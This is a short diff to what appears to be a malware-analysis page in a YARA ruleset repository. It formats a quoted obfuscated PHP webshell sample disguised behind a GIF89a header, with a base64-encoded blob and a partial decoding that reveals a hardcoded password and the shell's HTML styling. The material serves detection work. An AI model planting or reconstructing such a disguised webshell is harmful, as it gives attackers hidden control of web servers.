@@ -3,6 +3,7 @@ Obfuscated WebShell/GIF.Backdoor.GEN | Yara Ruleset
 
 This piece of Malware object's script was extracted from NX FireEye | MVX Engine 
 
+```
 GIF89a<title>GIF89a</title>
  <?php 
 $dos="DQoNCi8vJHBhc3N3b3JkID0gImh1b3NoYW4iOy8vyejWw8PcwusNCi8vLS0tLS0tLS0tLS0tLS
@@ -24,11 +25,11 @@ FyZ2luLXRvcDozcHg7bWFyZ2luLWJvdHRvbTozcHg7dGFibGUtbGF5b3V0OmZpeGVkO3dvcmQtYnJlYW
 s6YnJlYWstYWxsO30NCglhe2NvbG9yOiMwMDAwMDA7dGV4dC1kZWNvcmF0aW9uOm5vbmU7fQ0KCWE6aG
 92ZXJ7YmFja2dyb3VuZDojQ
 
-
+```
 
 #After Decoding the $dos content, it seems like this;
 
-
+```
 //$password = "huoshan";//
 //----------------------------------------------------------------------------------------------------2013-06-15
 
@@ -59,4 +60,4 @@ print<<<END
 	body{background:threedface;font-family:"Verdana", "Tahoma", "",sans-serif; font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}
 	a{color:#000000;text-decoration:none;}
 	a:hover{background:#
-
+```
